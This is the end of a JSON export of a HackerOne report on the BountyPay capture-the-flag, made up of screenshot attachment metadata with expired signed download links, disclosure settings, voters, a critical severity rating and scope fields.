      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cMzjcDJatcAyPJSrx3M4USQr?response-content-disposition=attachment%3B%20filename%3D%22admininterface.png%22%3B%20filename%2A%3DUTF-8%27%27admininterface.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c17769b15a868767297b4f92999af0589d55be397719533c7e73e55bbd50cbf9",
      "file_size": 28509,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858480,
      "file_name": "martenmickos-app.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/e9DN1TT4ycrfi8aYXcj5cNJa?response-content-disposition=attachment%3B%20filename%3D%22martenmickos-app.png%22%3B%20filename%2A%3DUTF-8%27%27martenmickos-app.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a67f7d44466ba4e86da1ed85fb31ff9a1835005f2bef78bb4a451a8b2a1ea3c1",
      "file_size": 18895,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858481,
      "file_name": "2fa-screen.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HRfuqYDWKqDb3pSuAeKJAezg?response-content-disposition=attachment%3B%20filename%3D%222fa-screen.png%22%3B%20filename%2A%3DUTF-8%27%272fa-screen.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2895d37d6df84cb604798658282bb7101019a3c3119cadff114a74192e59e8fe",
      "file_size": 18969,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858483,
      "file_name": "flag.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rtsjV3fqcwfJQeWNykhFQpP2?response-content-disposition=attachment%3B%20filename%3D%22flag.png%22%3B%20filename%2A%3DUTF-8%27%27flag.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fb93a41af51099714f91c3d46c9557a20d0b7507333ecea28847d39df963f319",
      "file_size": 27411,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-07-21T20:49:14.048Z",
  "allow_singular_disclosure_after": -112467446.22026908,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "brahim_boufakri01",
    "noxcaelo",
    "hexcon"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 48138,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.bountypay.h1ctf.com",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
